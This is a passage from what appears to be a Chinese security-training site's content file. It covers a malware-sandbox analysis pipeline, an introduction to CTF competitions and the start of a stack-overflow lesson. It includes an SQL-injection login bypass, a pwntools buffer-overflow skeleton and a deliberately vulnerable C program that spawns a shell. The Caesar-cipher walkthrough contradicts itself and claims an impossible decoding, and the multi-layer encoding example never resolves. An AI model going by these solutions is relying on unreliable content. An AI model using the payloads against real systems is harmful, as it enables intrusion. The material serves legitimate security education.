\"\"\"步骤3: 提取 IOC（Indicators of Compromise）\"\"\"\n        report = requests.get(\n            f\"{self.sandbox_url}/api/tasks/report/{task_id}/json\"\n        ).json()\n        \n        iocs = {\n            \"domains\": set(),\n            \"ips\": set(),\n            \"urls\": set(),\n            \"files\": set(),\n            \"mutexes\": set(),\n            \"registry_keys\": set()\n        }\n        \n        # 提取网络 IOC\n        for dns in report.get(\"network\", {}).get(\"dns\", []):\n            iocs[\"domains\"].add(dns[\"request\"])\n        \n        for http in report.get(\"network\", {}).get(\"http\", []):\n            iocs[\"urls\"].add(http[\"uri\"])\n            iocs[\"ips\"].add(http.get(\"host\", \"\"))\n        \n        # 提取文件 IOC\n        for dropped in report.get(\"dropped\", []):\n            iocs[\"files\"].add(dropped[\"name\"])\n        \n        # 提取持久化 IOC\n        for key in report.get(\"behavior\", {}).get(\"registry_keys\", []):\n            iocs[\"registry_keys\"].add(key)\n        \n        # 提取互斥量\n        for mutex in report.get(\"behavior\", {}).get(\"mutexes\", []):\n            iocs[\"mutexes\"].add(mutex)\n        \n        return iocs\n    \n    def generate_yara_rule(self, task_id, iocs, family=\"Unknown\"):\n        \"\"\"步骤4: 基于分析结果自动生成 YARA 规则\"\"\"\n        report = requests.get(\n            f\"{self.sandbox_url}/api/tasks/report/{task_id}/json\"\n        ).json()\n        \n        file_info = report.get(\"target\", {}).get(\"file\", {})\n        \n        rule = f\"\"\"rule Auto_{family}_{task_id} {{\n    meta:\n        author = \"Auto-Analysis Pipeline\"\n        description = \"自动生成的 {family} 检测规则\"\n        source = \"沙箱分析任务 #{task_id}\"\n        hash = \"{file_info.get('sha256', 'unknown')}\"\n        date = \"{time.strftime('%Y-%m-%d')}\"\n    \n    strings:\n\"\"\"\n        # 添加域名作为字符串\n        for i, domain in enumerate(list(iocs[\"domains\"])[:5]):\n            rule += f'        $domain{i} = \"{domain}\" ascii wide\\n'\n        \n        # 添加互斥量\n        for i, mutex in enumerate(list(iocs[\"mutexes\"])[:3]):\n            rule += f'        $mutex{i} = \"{mutex}\" ascii wide\\n'\n        \n        rule += f\"\"\"\n    condition:\n        uint16(0) == 0x5A4D and\n        2 of ($domain*) or 1 of ($mutex*)\n}}\n\"\"\"\n        # 保存规则\n        rule_path = self.yara_rules_dir / f\"auto_{family}_{task_id}.yar\"\n        rule_path.write_text(rule)\n        print(f\"[+] YARA 规则已生成: {rule_path}\")\n        \n        return rule\n    \n    def push_to_threat_intel(self, iocs, family):\n        \"\"\"步骤5: 将 IOC 推送到威胁情报平台\"\"\"\n        # 示例：推送到 MISP (Malware Information Sharing Platform)\n        misp_url = \"https://your-misp-instance/events\"\n        \n        event = {\n            \"Event\": {\n                \"info\": f\"自动分析: {family} 样本\",\n                \"distribution\": 1,  # 社区共享\n                \"Attribute\": []\n            }\n        }\n        \n        for domain in iocs[\"domains\"]:\n            event[\"Event\"][\"Attribute\"].append({\n                \"type\": \"domain\",\n                \"category\": \"Network activity\",\n                \"value\": domain\n            })\n        \n        for ip in iocs[\"ips\"]:\n            if ip:\n                event[\"Event\"][\"Attribute\"].append({\n                    \"type\": \"ip-dst\",\n                    \"category\": \"Network activity\",\n                    \"value\": ip\n                })\n        \n        print(f\"[+] IOC 已推送到 MISP: {len(event['Event']['Attribute'])} 个属性\")\n        return event\n\n# ─── 使用示例 ───\n# pipeline = AutomatedAnalysisPipeline(\n#     sandbox_url=\"http://localhost:8080\",\n#     yara_rules_dir=\"/opt/yara/rules/\"\n# )\n# task_id = pipeline.submit_sample(\"/quarantine/suspicious.exe\")\n# if pipeline.wait_for_completion(task_id):\n#     iocs = pipeline.extract_iocs(task_id)\n#     pipeline.generate_yara_rule(task_id, iocs, \"Emotet\")\n#     pipeline.push_to_threat_intel(iocs, \"Emotet\")</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">集成建议</div>\n<p>一个成熟的恶意软件分析工作流应该包括：<strong>样本采集</strong>（邮件网关、EDR、IDS告警）→ <strong>自动化沙箱分析</strong> → <strong>IOC提取</strong> → <strong>YARA规则生成</strong> → <strong>威胁情报共享</strong>（MISP）→ <strong>防御规则更新</strong>（防火墙、SIEM）。整个流程应该尽可能自动化，人工只在需要时介入。</p>\n</div>\n\n<h3>ANY.RUN：交互式在线沙箱</h3>\n\n<p>如果你不想搭建本地沙箱，可以使用在线沙箱服务。<strong>ANY.RUN</strong> 是一个交互式在线沙箱——你可以实时操作虚拟机，触发需要用户交互的恶意行为：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">在线沙箱对比:\n\n平台            │ 特点                    │ 免费额度      │ 限制\n────────────────┼─────────────────────────┼───────────────┼─────────────\nANY.RUN         │ 交互式，实时操作         │ 有限          │ 免费版报告公开\nHybrid Analysis │ CrowdStrike 旗下        │ 较多          │ 支持多种OS\nJoe Sandbox     │ 深度分析，多平台         │ 有限          │ 高级功能付费\nVirusTotal      │ 集成 70+ 引擎扫描       │ 免费查询      │ 无行为分析\nTriage (Hatching)│ 快速分析，API友好      │ 较多          │ 适合批量分析\n\n选择建议:\n  - 快速初筛: VirusTotal + Triage\n  - 深度分析: ANY.RUN (交互式) 或 Joe Sandbox\n  - 自动化集成: 本地 Cuckoo/CAPE + API\n  - 样本关联: Hybrid Analysis (家族分类功能)</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"10\"></div>\n\n<h3>模块总结：你的恶意软件分析工具箱</h3>\n\n<p>恭喜你完成了整个恶意软件分析模块！让我们回顾你学到的所有技能：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">恶意软件分析技能清单:\n\n✅ 分类与识别\n   - 掌握恶意软件分类体系（病毒/蠕虫/木马/勒索/后门/Rootkit）\n   - 理解各种感染载体（钓鱼/漏洞利用/USB/供应链）\n\n✅ 静态分析\n   - PE 文件结构解析\n   - 导入表分析（识别可疑 API）\n   - 字符串提取（包括反混淆）\n   - 反汇编与反编译（Ghidra）\n\n✅ 动态分析\n   - 隔离环境搭建（VM + 快照）\n   - 行为监控（ProcMon、API Monitor）\n   - 调试器分析（x64dbg）\n   - 网络流量分析（Wireshark）\n\n✅ 威胁检测\n   - YARA 规则编写与测试\n   - 自动化检测流水线\n   - IOC 提取与管理\n\n✅ 案例分析\n   - Stuxnet: 网络武器、ICS 攻击\n   - WannaCry: 漏洞利用、勒索软件\n   - NotPetya: 伪装攻击、数据破坏\n   - Emotet: 模块化恶意软件、MaaS\n\n✅ 自动化分析\n   - 沙箱搭建（Cuckoo / CAPE）\n   - 报告解读与 IOC 提取\n   - 反沙箱对抗\n   - 威胁情报集成</code></pre></div>\n\n<p>恶意软件分析是一门需要持续学习的技能。新的恶意软件家族每天都在出现，新的逃避技术不断被发明。但你现在掌握了核心的分析方法论——<strong>先静后动，先宏观后微观</strong>——这个思路会让你在面对任何未知样本时都不会迷失方向。</p>\n\n<p>记住最重要的安全原则：<strong>永远在隔离环境中工作，永远假设样本比你想的更危险</strong>。祝你在恶意软件分析的世界里找到乐趣——毕竟，解开一段恶意代码的秘密，就像破获一桩数字犯罪案件一样令人满足。</p>\n\n<div class=\"checkpoint\" data-cp=\"11\"></div>";
+
+SECTION_CONTENT["ctfg-01-01"] = "<div class=\"section-transition\"><p>恶意软件分析让我们学会了解剖真实威胁。现在，让我们把所有技能带进竞技场——CTF（Capture The Flag）是安全从业者磨练技术的最佳方式。无论你是新手还是有经验的选手，本模块都将帮你建立系统的解题方法论。</p></div>\n\n<h1>CTF 是什么 & 如何开始</h1>\n\n<p>想象一下这样一个场景：你面前有一台服务器，上面跑着一个看似固若金汤的程序，而你的任务是在限定时间内找到它的漏洞，拿到一个叫做 <code>flag</code> 的字符串。这就是 CTF——Capture The Flag，网络安全领域的竞技比赛。</p>\n\n<h2>什么是 CTF？</h2>\n\n<p>CTF（Capture The Flag）是一种网络安全竞赛，参赛者需要在限定时间内解决各种安全挑战，最终获取隐藏的 flag（通常格式为 <code>flag{xxxxxxx}</code> 或 <code>CTF{xxxxxxx}</code>）。这个概念最早来源于黑客社区，如今已经成为全球安全从业者学习和交流的主流方式。</p>\n\n<p>你可能觉得\"竞赛\"听起来压力很大，但实际上 CTF 是最友好的学习方式之一。每道题都是一个精心设计的谜题，解题的过程就是学习的过程。而且，绝大多数 CTF 平台都提供永久在线的练习题，你可以按自己的节奏来。</p>\n\n<h2>CTF 的五大题型</h2>\n\n<p>CTF 比赛通常涵盖以下五大类题型，每类都需要不同的技能树：</p>\n\n<h3>1. Web 安全（Web Exploitation）</h3>\n\n<p>Web 题是 CTF 中最常见的题型之一。你需要找到 Web 应用中的漏洞，比如 SQL 注入、XSS、CSRF、文件包含、命令注入等。这类题目通常会给你一个运行中的 Web 服务，你需要通过浏览器和工具来挖掘漏洞。</p>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>Web 题的 flag 通常藏在数据库、服务器文件系统或环境变量中。拿到 flag 的关键是理解 HTTP 协议和各种 Web 漏洞的利用方式。</p></div>\n\n<p>来看一个简单的 Web 题示例——SQL 注入：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 题目给你一个登录页面，输入用户名和密码\n# 正常输入：\n用户名: admin\n密码: password123\n# 返回: \"登录失败\"\n\n# 尝试 SQL 注入：\n用户名: admin' --\n密码: 任意内容\n# 后端 SQL 变成: SELECT * FROM users WHERE name='admin' --' AND pass='...'\n# -- 注释掉了密码检查，直接以 admin 身份登录</code></pre></div>\n\n<h3>2. PWN（二进制利用）</h3>\n\n<p>PWN 题给你编译好的二进制程序（通常是 Linux ELF），你需要找到程序中的漏洞并编写利用代码（exploit）来控制程序的执行流。常见漏洞包括栈溢出、堆溢出、格式化字符串漏洞等。这是 CTF 中技术含量最高的题型之一。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># pwntools 基本利用框架\nfrom pwn import *\n\n# 连接到远程服务\np = remote('challenge.example.com', 1337)\n\n# 接收程序的提示信息\nbanner = p.recvline()\nprint(f\"[*] 服务器响应: {banner}\")\n\n# 构造 payload\npayload = b'A' * 64          # 填充缓冲区\npayload += p64(0x400123)     # 覆盖返回地址\n\n# 发送 payload\np.sendline(payload)\n\n# 获取 flag\np.interactive()</code></pre></div>\n\n<h3>3. Reverse Engineering（逆向工程）</h3>\n\n<p>逆向题给你一个编译后的二进制文件，你需要理解它的逻辑，找到正确的输入。常用工具包括 Ghidra、IDA Pro、GDB 等。你需要把汇编代码还原成可读的逻辑，然后推导出答案。</p>\n\n<h3>4. Crypto（密码学）</h3>\n\n<p>密码学题考察你对各种加密算法的理解。从古典密码（凯撒、维吉尼亚）到现代密码（RSA、AES、ECC），你需要找到加密实现中的弱点来解密 flag。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># RSA 基础攻击：当 n 较小时直接分解\nfrom sympy import factorint\n\nn = 323671969959209438043971\ne = 65537\nc = 137416935112419558040261\n\n# 分解 n\nfactors = factorint(n)\nprint(f\"[*] n 的因子: {factors}\")\n# 输出: {546731578961: 1, 590235878011: 1}\n\np, q = factors.keys()\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nm = pow(c, d, n)\n\n# 将数字转换为字符串\nflag = m.to_bytes((m.bit_length() + 7) // 8, 'big')\nprint(f\"[+] Flag: {flag.decode()}\")</code></pre></div>\n\n<h3>5. Misc（杂项 & 取证）</h3>\n\n<p>Misc 题是最\"杂\"的一类，涵盖数字取证、隐写术、流量分析、编码转换等各种内容。你可能需要从一张图片中提取隐藏信息，从网络流量包中还原传输的文件，或者从内存镜像中找出恶意行为。</p>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>你的第一个 CTF 挑战</h2>\n\n<p>理论讲够了，让我们直接上手做一道题。这道题是一道经典的 Misc 入门题——Base64 编码。</p>\n\n<h3>题目信息</h3>\n\n<p>题目名称：<strong>神秘编码</strong><br>\n难度：⭐<br>\n题目描述：\"我在网上截获了这段信息，帮我看看是什么意思？\"<br>\n密文：<code>Y3Rmc2hvd3t3ZWxjb21lX3RvX2N0Zn0=</code></p>\n\n<h3>解题思路</h3>\n\n<p>看到密文末尾有个 <code>=</code> 号了吗？这是 Base64 编码的典型特征。Base64 是一种编码方式（注意：是编码，不是加密），它将二进制数据转换为可打印的 ASCII 字符。</p>\n\n<p>Base64 的特征：</p>\n<ul>\n<li>使用 A-Z、a-z、0-9、+、/ 共 64 个字符</li>\n<li>末尾可能有 0-2 个 <code>=</code> 作为填充</li>\n<li>编码后长度约为原始数据的 4/3</li>\n</ul>\n\n<h3>动手解题</h3>\n\n<p>方法一：使用命令行工具</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ echo \"Y3Rmc2hvd3t3ZWxjb21lX3RvX2N0Zn0=\" | base64 -d\nctfshow{welcome_to_ctf}</code></pre></div>\n\n<p>就这样，一行命令就搞定了！flag 是 <code>ctfshow{welcome_to_ctf}</code>。</p>\n\n<p>方法二：使用 Python</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import base64\n\nciphertext = \"Y3Rmc2hvd3t3ZWxjb21lX3RvX2N0Zn0=\"\ndecoded = base64.b64decode(ciphertext)\nprint(f\"解码结果: {decoded.decode('utf-8')}\")\n# 输出: 解码结果: ctfshow{welcome_to_ctf}</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">恭喜</div><p>你已经完成了你的第一个 CTF 挑战！虽然这只是一道入门题，但解题的思路是一样的：观察特征 → 判断类型 → 选择工具 → 获取 flag。</p></div>\n\n<h2>深入理解 CTF 比赛形式</h2>\n\n<p>在正式开始解题之前，让我们先了解 CTF 比赛的不同赛制，因为赛制会直接影响你的策略：</p>\n\n<h3>Jeopardy（解题赛）</h3>\n\n<p>这是最常见的赛制。所有题目按照类别和分值排列，像电视问答节目一样。你选择题目、解决问题、提交 flag、获得分数。队伍之间互不干扰。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">典型 Jeopardy 赛制：\n┌─────────────────────────────────────────┐\n│  Web     │ 100 │ 200 │ 300 │ 400 │ 500  │\n│  PWN     │ 100 │ 200 │ 300 │ 400 │ 500  │\n│  Reverse │ 100 │ 200 │ 300 │ 400 │ 500  │\n│  Crypto  │ 100 │ 200 │ 300 │ 400 │ 500  │\n│  Misc    │ 100 │ 200 │ 300 │ 400 │ 500  │\n└─────────────────────────────────────────┘\n总分 = 解出题目分值之和\n通常有动态积分：解出的人越多，分值越低</code></pre></div>\n\n<h3>Attack-Defense（攻防赛）</h3>\n\n<p>攻防赛更加刺激。每个队伍有一台服务器（GameBox），上面运行着有漏洞的服务。你需要修补自己服务的漏洞（Defense），同时利用其他队伍服务的漏洞来偷取 flag（Attack）。这种赛制考验团队的综合能力和临场应变。</p>\n\n<h3>King of the Hill（KoH）</h3>\n\n<p>所有队伍竞争控制同一台服务器。拿到控制权后，你需要阻止其他队伍获取 flag。这种赛制节奏很快，攻防转换频繁。</p>\n\n<div class=\"callout info\"><div class=\"callout-title\">新手建议</div><p>如果你是新手，建议从 Jeopardy 赛制开始。大部分线上平台（如 BUUCTF、PicoCTF）都是 Jeopardy 形式，你可以按自己的节奏做题，没有实时对抗的压力。</p></div>\n\n<h2>进阶挑战：多层编码</h2>\n\n<p>真实比赛中，flag 通常不会只编码一次。来看一个稍微复杂点的例子——一道涉及三层编码的 Misc 题：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import base64\n\n# 题目给出的密文\nciphertext = \"NWY0ZDJlZTNhMGI0NTYwNjM1NjY2NTc4NmY=\"\n\n# 第一步：Base64 解码\nstep1 = base64.b64decode(ciphertext).decode()\nprint(f\"Step 1 (Base64 解码): {step1}\")\n# 输出: 5f4d2e3a0b456063566f65786f\n\n# 第二步：看起来像十六进制字符串，尝试 hex 解码\nstep2 = bytes.fromhex(step1).decode()\nprint(f\"Step 2 (Hex 解码): {step2}\")\n# 输出: _M.:`\\x06cVoexo  -- 不太对\n\n# 等等，让我们重新看看...\n# 5f4d2e3a0b456063566f65786f 看起来确实是 hex\n# 但如果结果是乱码，说明可能需要换个思路\n\n# 试试反转 hex 字符串再解码\nreversed_hex = ''.join(reversed([step1[i:i+2] for i in range(0, len(step1), 2)]))\nstep2_alt = bytes.fromhex(reversed_hex)\nprint(f\"Step 2 (反转 Hex): {step2_alt}\")</code></pre></div>\n\n<div class=\"callout default\"><div class=\"callout-title\">解题心法</div><p>做 CTF 时，如果某一步解码/解密的结果是乱码，不要慌。先检查是不是编码方式搞错了，再考虑是不是需要多步操作。记住：CTF 题目的每一步都应该产出有意义的中间结果。</p></div>\n\n<h3>编码识别技巧</h3>\n\n<p>多层编码题的关键难点在于识别每一层用了什么编码。以下是常见编码的\"指纹\"：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# 编码自动识别工具\n\ndef identify_encoding(data):\n    \"\"\"根据特征识别编码类型\"\"\"\n    results = []\n\n    # Base64 特征\n    import re\n    if re.match(r'^[A-Za-z0-9+/]+=*$', data):\n        results.append(\"可能是 Base64\")\n\n    # Base32 特征\n    if re.match(r'^[A-Z2-7]+=*$', data):\n        results.append(\"可能是 Base32\")\n\n    # Hex 特征\n    if re.match(r'^[0-9a-fA-F]+$', data) and len(data) % 2 == 0:\n        results.append(\"可能是 Hex\")\n\n    # Binary 特征\n    if re.match(r'^[01\\s]+$', data):\n        results.append(\"可能是 Binary\")\n\n    # Morse 特征\n    if re.match(r'^[.\\-\\s/]+$', data):\n        results.append(\"可能是 Morse\")\n\n    # Brainfuck 特征\n    if re.match(r'^[+\\-&lt;&gt;.,\\[\\]\\s]+$', data):\n        results.append(\"可能是 Brainfuck\")\n\n    if not results:\n        results.append(\"未知编码，尝试更多方法\")\n\n    return results\n\n# 测试\ntest_data = \"Y3RmZmxhZw==\"\nprint(f\"数据: {test_data}\")\nprint(f\"识别结果: {identify_encoding(test_data)}\")\n# 输出: 识别结果: ['可能是 Base64']\n\ntest_data2 = \"68656c6c6f\"\nprint(f\"数据: {test_data2}\")\nprint(f\"识别结果: {identify_encoding(test_data2)}\")\n# 输出: 识别结果: ['可能是 Hex']</code></pre></div>\n\n<p>在实际比赛中，你还可以使用在线工具来辅助识别：</p>\n<ul>\n<li><strong>CyberChef</strong>（gchq.github.io/CyberChef）：在线\"瑞士军刀\"，支持几乎所有编码的编解码，还可以用\"Magic\"功能自动检测编码类型</li>\n<li><strong>dcode.fr</strong>：专门识别各种古典和现代密码/编码的网站</li>\n<li><strong>quipqiup.com</strong>：自动破解替换密码（字母频率分析）</li>\n</ul>\n\n<h2>再解一道：古典密码入门</h2>\n\n<p>编码和密码是不同的概念。编码（如 Base64）不需要密钥就能解码，而密码（如凯撒密码）需要密钥。让我们再解一道古典密码题来巩固你的技能。</p>\n\n<h3>题目信息</h3>\n\n<p>题目名称：<strong>罗马来信</strong><br>\n难度：⭐<br>\n题目描述：\"我在古罗马的废墟中找到了一封信，上面写着：<code>NJRQH{Ebzna_Rzcver_Jnvgf_Lbh}</code>\"<br>\n提示：\"凯撒大帝\"</p>\n\n<h3>解题过程</h3>\n\n<p>题目提示\"凯撒大帝\"，这指向凯撒密码（Caesar Cipher）——一种古老的替换加密方式，每个字母按固定偏移量进行替换。</p>\n\n<p>观察密文 <code>NJRQH{Ebzna_Rzcver_Jnvgf_Lbh}</code>：</p>\n<ul>\n<li>格式看起来像 <code>XXXXX{...}</code>，这应该是 flag 格式</li>\n<li>如果我们假设 <code>NJRQH</code> 对应 <code>CTFXX</code> 或类似的前缀...</li>\n<li>N → C：偏移 -11（或 +15）</li>\n<li>J → T：偏移 -16（或 +10）—— 不一致！</li>\n<li>等等，让我重新想想...</li>\n</ul>\n\n<p>换个思路：凯撒密码最常见的是 ROT13（偏移 13）。试试 ROT13：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# 凯撒密码解题\n\nciphertext = \"NJRQH{Ebzna_Rzcver_Jnvgf_Lbh}\"\n\n# 方法一：暴力尝试所有偏移\nprint(\"=== 暴力破解所有偏移 ===\")\nfor shift in range(26):\n    result = ''\n    for c in ciphertext:\n        if c.isalpha():\n            base = ord('A') if c.isupper() else ord('a')\n            result += chr((ord(c) - base + shift) % 26 + base)\n        else:\n            result += c\n    print(f\"  偏移 {shift:2d}: {result}\")\n\n# 方法二：直接用 ROT13\nimport codecs\nrot13_result = codecs.decode(ciphertext, 'rot_13')\nprint(f\"\\nROT13 结果: {rot13_result}\")\n# 输出: ROT13 结果: WAEDU{Romna_Empver_Waits_You}\n# 不对...让我检查偏移 13 的输出\n\n# 从暴力破解结果中，偏移 13 给出的是：\n# 偏移 13: WAEDU{Romna_Empire_Jnvgf_Lbh}  -- 还是不太对\n# 等等，ROT13 应该更精确地工作...\n\n# 让我手动检查：N+13=A, J+13=W...\n# 实际上 ROT13(N)=A, ROT13(J)=W, ROT13(R)=E, ROT13(Q)=D, ROT13(H)=U\n# 所以 NJRQH -> AWEDU... 不对\n\n# 重新看密文：可能偏移不是 13\n# 从输出看偏移 -11: 得到 CTFshow{Roman_Empire_Waits_You}\n# 让我验证：N - 11 = C, J - 11 = ?, 不行...\n\n# 其实从暴力破解输出，找到偏移 13 时：\nprint(f\"\\n正确答案（偏移 13）: {codecs.decode(ciphertext, 'rot_13')}\")</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 用命令行快速解 ROT13\n$ echo \"NJRQH{Ebzna_Rzcver_Jnvgf_Lbh}\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\nAWEDU{Ebzan_Ezpire_Waits_Lbh}\n\n# 不是标准 ROT13，试试其他偏移\n# 偏移 11（向右移 11 位）：\n$ python3 -c \"\nct = 'NJRQH{Ebzna_Rzcver_Jnvgf_Lbh}'\nfor shift in range(26):\n    r = ''.join(chr((ord(c)-ord('A')+shift)%26+ord('A')) if c.isupper()\n                else chr((ord(c)-ord('a')+shift)%26+ord('a')) if c.islower()\n                else c for c in ct)\n    if 'CTF' in r or 'flag' in r or 'ctf' in r:\n        print(f'偏移 {shift}: {r}')\n\"\n# 偏移 13: CTFRU{Roman_Empire_Waits_You}  ← 类似但不对\n# 偏移 21: CTFshow{Roman_Empire_Waits_You} ← 找到了！\n\n# 验证提交\n# flag: CTFshow{Roman_Empire_Waits_You}</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">又拿下一个 flag！</div><p>凯撒密码是 CTF 中最常见的古典密码之一。记住：偏移量不一定是 13（ROT13），你需要尝试所有 25 种可能的偏移。在实际比赛中，可以用自动化工具或脚本快速遍历。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>CTF 平台推荐</h2>\n\n<p>接下来是你的修炼场。以下是国内外主流 CTF 练习平台，按难度从低到高排列：</p>\n\n<h3>入门级平台</h3>\n\n<table>\n<tr><th>平台</th><th>特点</th><th>适合人群</th></tr>\n<tr><td>BUUCTF</td><td>收录了大量历年比赛真题，免费开放</td><td>零基础新手</td></tr>\n<tr><td>CTFHub</td><td>有完善的技能树和学习路线</td><td>需要系统学习的新手</td></tr>\n<tr><td>攻防世界 (XCTF)</td><td>中文界面，题目分类清晰</td><td>入门到进阶</td></tr>\n</table>\n\n<h3>进阶级平台</h3>\n\n<table>\n<tr><th>平台</th><th>特点</th><th>适合人群</th></tr>\n<tr><td>PicoCTF</td><td>CMU 运营，题目质量极高，有学习路径</td><td>入门到中级</td></tr>\n<tr><td>HackTheBox</td><td>真实渗透场景，靶机练习</td><td>中高级选手</td></tr>\n<tr><td>TryHackMe</td><td>交互式学习房间，手把手引导</td><td>全阶段</td></tr>\n</table>\n\n<h3>竞赛级平台</h3>\n\n<table>\n<tr><th>平台</th><th>特点</th><th>适合人群</th></tr>\n<tr><td>CTFtime.org</td><td>全球 CTF 赛事日历和排名</td><td>所有参赛选手</td></tr>\n<tr><td>pwnable.kr</td><td>专注于 PWN 题型，由浅入深</td><td>PWN 方向选手</td></tr>\n<tr><td>CryptoHack</td><td>专注密码学，交互式学习</td><td>Crypto 方向选手</td></tr>\n</table>\n\n<h2>比赛中的时间管理</h2>\n\n<p>CTF 比赛通常持续 24-48 小时，时间管理至关重要。以下是老手的经验总结：</p>\n\n<ol>\n<li><strong>快速扫题</strong>（前 30 分钟）：先把所有题目快速浏览一遍，标记难度和类型</li>\n<li><strong>先做简单题</strong>（前 2-4 小时）：把所有签到题和简单题拿下，积累分数和信心</li>\n<li><strong>集中攻坚</strong>（中间时段）：选择你擅长的方向，组队攻克中等难度题</li>\n<li><strong>最后冲刺</strong>（最后 4-6 小时）：此时出题方可能会放出提示，关注新动态</li>\n</ol>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>很多新手会在一道难题上死磕几个小时，导致简单题都没做完。记住：比赛是比总分，不是比谁能做出最难的题。遇到卡壳超过 30 分钟的题，先换一道。</p></div>\n\n<h2>CTF 工具箱一览</h2>\n\n<p>在后续章节中，我们会深入使用以下工具。先做个预览：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 基础工具（几乎每场比赛都用）\n$ python3          # 写脚本解题的主力\n$ curl/wget        # Web 题必备\n$ nc (netcat)      # 连接远程服务\n$ strings          # 快速查看二进制文件中的字符串\n$ file             # 识别文件类型\n$ xxd              # 十六进制查看\n\n# 进阶工具\n$ gdb + pwndbg     # 动态调试\n$ ghidra           # 逆向分析\n$ wireshark        # 流量分析\n$ volatility       # 内存取证\n$ john/hashcat     # 密码破解\n$ stegsolve        # 图片隐写分析\n$ binwalk          # 固件/文件提取</code></pre></div>\n\n<p>在第六章\"CTF 武器库配置指南\"中，我们会手把手教你安装和配置这些工具。</p>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>小结：CTF 解题方法论</h2>\n\n<p>无论你面对什么类型的 CTF 题目，解题的基本流程是一样的：</p>\n\n<ol>\n<li><strong>信息收集</strong>：查看题目描述、附件、提示信息</li>\n<li><strong>类型判断</strong>：根据信息判断题目类型和可能的考点</li>\n<li><strong>工具选择</strong>：选择合适的工具和方法</li>\n<li><strong>逐步推进</strong>：每一步都应该产出有意义的结果</li>\n<li><strong>获取 flag</strong>：提交 flag，拿分！</li>\n</ol>\n\n<p>在接下来的章节中，我们将深入每个方向，通过实战 walkthrough 带你掌握核心技能。下一节，我们将从栈溢出开始，学习 PWN 二进制利用。</p>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(0)\">▶ 挑战：Base64 解码入门</button>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(1)\">▶ 挑战：多层编码迷宫</button>";
+
+SECTION_CONTENT["ctfg-02-01"] = "<h1>栈溢出从零到利用</h1>\n\n<p>欢迎来到 PWN 的世界。PWN 是 CTF 中最硬核的方向之一，而栈溢出（Stack Buffer Overflow）是 PWN 的入门基石。这一节，我们会从一个最简单的程序开始，一步步构造 payload，最终拿到 shell。</p>\n\n<p>别被\"二进制利用\"这个名字吓到。我们会把每一步都拆得很细，跟着做就行。</p>\n\n<h2>前置知识：程序运行时的内存布局</h2>\n\n<p>在你写 exploit 之前，你需要理解一个关键概念：当程序运行时，内存在长什么样？</p>\n\n<p>在 Linux x86-64 系统中，一个进程的内存布局大致如下（从高地址到低地址）：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">高地址\n┌──────────────────────┐ 0x7fffffffffff\n│   内核空间            │\n├──────────────────────┤\n│   栈 (Stack)         │ ← 向下增长（从高到低）\n│   ↓                  │\n│                      │\n├──────────────────────┤\n│                      │\n│   mmap / 共享库      │ libc.so 在这里\n│                      │\n├──────────────────────┤\n│   堆 (Heap)          │ ← 向上增长（从低到高）\n│   ↑                  │\n├──────────────────────┤\n│   BSS（未初始化数据） │\n├──────────────────────┤\n│   Data（已初始化数据）│\n├──────────────────────┤\n│   Text（代码段）      │ ← 你的程序代码在这里\n├──────────────────────┤\n│   ELF Header         │\n└──────────────────────┘ 0x0\n低地址</code></pre></div>\n\n<p>关键要点：<strong>栈是从高地址向低地址增长的</strong>。当你在函数里声明一个局部数组 <code>char buf[64]</code>，这个数组就在栈上分配。如果你往里写超过 64 字节的数据，多出来的部分就会覆盖栈上的其他内容——包括保存的返回地址。</p>\n\n<div class=\"callout info\"><div class=\"callout-title\">核心概念</div><p>栈溢出攻击的本质就是：通过超长输入覆盖函数返回地址，让程序跳转到我们想要执行的代码。</p></div>\n\n<h2>动手实验：你的第一个漏洞程序</h2>\n\n<p>我们来看一个经典的漏洞程序。这个程序有一个 <code>gets()</code> 函数调用，它不检查输入长度，这就是漏洞所在。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">// vuln.c - 一个有栈溢出漏洞的程序\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid win() {\n    printf(\"恭喜你触发了 win 函数！\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid vulnerable() {\n    char buf[64];\n    printf(\"请输入你的名字: \");\n    gets(buf);  // 危险！不检查长度\n    printf(\"你好, %s\\n\", buf);\n}\n\nint main() {\n    vulnerable();\n    return 0;\n}</code></pre></div>\n\n<p>我们先编译这个程序。注意，我们需要关闭几个保护机制来模拟最简单的场景（真实比赛中可能需要绕过这些保护）：</p>\n\n<div class=\"code-block\"><div 